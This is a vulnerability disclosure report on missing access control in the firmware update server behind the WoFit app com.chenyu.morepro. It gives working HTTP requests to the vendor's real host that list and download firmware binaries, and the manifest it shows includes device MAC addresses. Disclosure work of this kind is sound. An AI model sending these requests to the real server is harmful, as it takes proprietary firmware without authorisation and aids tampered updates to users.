# Vulnerability Report - com.chenyu.morepro- Incorrect Access Control

**Product:** `com.chenyu.morepro` 

**Vendor:** [WoFit](http://wo-smart.com/)

**Version:** 7.2.3

**Vulnerability Type:** Incorrect Access Control

**Severity:** High

## Description

The `com.chenyu.morepro` , developed by **Wo-Smart**, suffers from an Incorrect Access Control vulnerability during the device firmware update process. The app uses HTTPS requests to download firmware updates. By reverse engineering the app, it was possible to identify the firmware download mechanism and the download link. Dynamic testing revealed that the vendor's firmware server lacks proper access control, leading to **firmware leakage**.

## Reproduction Steps

1. The `queryDeviceOTAConfigInfo` method in the `QueryDeviceInfoService` class  and the `BaseUrl` String value in the `FitupHttpUtil` class provide the necessary URL and other information required for the HTTP request. Static reverse engineering allows for the reconstruction of the complete request as follows:

   ![image-20241003102958145](https://s2.loli.net/2024/10/03/7ZcAzEeKhPUQaB4.png)

   ![image-20241003103409408](https://s2.loli.net/2024/10/03/V4P9sMIeTz7jFU3.png)

2. Sending this URL request to the firmware server results in a direct response containing the latest firmware information as follows:

   > Request

   ```http
   GET https://apisvr.wo-smart.com:7443/static/version_android.json HTTP/1.1
   Host: apisvr.wo-smart.com:7443
   Content-Type: text/plain
   Content-Length: 0
   ```

   > Response:

   ```http
   HTTP/1.1 200 OK
   Date: Thu, 03 Oct 2024 02:25:04 GMT
   Server: Apache/2.4.18 (Ubuntu)
   Access-Control-Allow-Origin: *
   Access-Control-Allow-Methods: POST, OPTIONS
   Access-Control-Allow-Headers: Content-Type
   Last-Modified: Mon, 30 Sep 2024 09:21:32 GMT
   ETag: "40da-62352bb0eea96"
   Accept-Ranges: bytes
   Content-Length: 16602
   Vary: Accept-Encoding
   Content-Type: application/json
   
   {
       "32510&SPECIAL_OTA&TK79": {
           "versionCode": 60310,
           "versionName": "5.6.3.10",
           "assignDevice": true,
           "deviceMacs": [
               "66:06:4c:00:0b:9d",
               "test"
           ],
           "upgradeDes": "TK79 upgrade",
           "fileUrl": "static/app_MP_TK79_5.6.3.10_ded9c2aa-6ad981c10c63b9b8a813444b860a1eae.bin"
       },
       "32510&OTA&TK79": {
           "versionCode": 60310,
           "versionName": "5.6.3.10",
           "assignDevice": true,
           "deviceMacs": [
               "66:06:4C:00:0B:89"
           ],
           "upgradeDes": "TK79 upgrade",
           "fileUrl": "static/app_MP_TK79_5.6.3.10_ded9c2aa-6ad981c10c63b9b8a813444b860a1eae.bin"
       },
        ......
   ```

   Then, contact the `fileUrl` with `BaseUrl`, we can access the firmware directly.

   ```HTTP
   GET https://apisvr.wo-smart.com:7443/static/app_MP_TK79_5.6.3.10_ded9c2aa-6ad981c10c63b9b8a813444b860a1eae.bin
   HTTP/1.1
   Host: apisvr.wo-smart.com:7443
   Content-Type: text/plain
   ```

3. Consequently, the unprotected firmware can be directly downloaded using this information.

   ![image-20241003103734008](https://s2.loli.net/2024/10/03/2L6UoOzJwsuqWhb.png)
   
   In total, we successfully downloaded 38 firmware by exploiting this vulnerability.


## Impact

An attacker can exploit this vulnerability to:

* Download the latest firmware before it is officially released.
* Analyze the firmware for vulnerabilities or proprietary information.
* Create modified firmware images with malicious code.
* Distribute compromised firmware updates to unsuspecting users.

## Remediation

* Implement proper access control on the firmware server, such as device ID and user ID verification.
* Enhance the app's firmware update mechanism to include authentication credentials in the requests.


## Disclaimer

This vulnerability report is provided for informational purposes only and should not be used for any malicious activities. The author is not responsible for any misuse of the information contained herein.